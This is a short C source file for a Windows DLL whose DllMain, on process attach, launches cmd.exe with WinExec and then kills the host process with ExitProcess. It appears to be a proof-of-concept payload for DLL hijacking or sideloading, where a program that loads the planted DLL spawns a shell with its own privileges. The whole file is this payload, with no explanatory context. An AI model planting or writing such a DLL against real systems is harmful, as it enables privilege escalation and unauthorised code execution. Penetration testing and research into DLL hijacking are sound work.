#include "pch.h"
#include <Windows.h>
#include <stdlib.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    char run[] = "cmd.exe";

    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        WinExec(run, SW_SHOWNORMAL);
        ExitProcess(0);
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

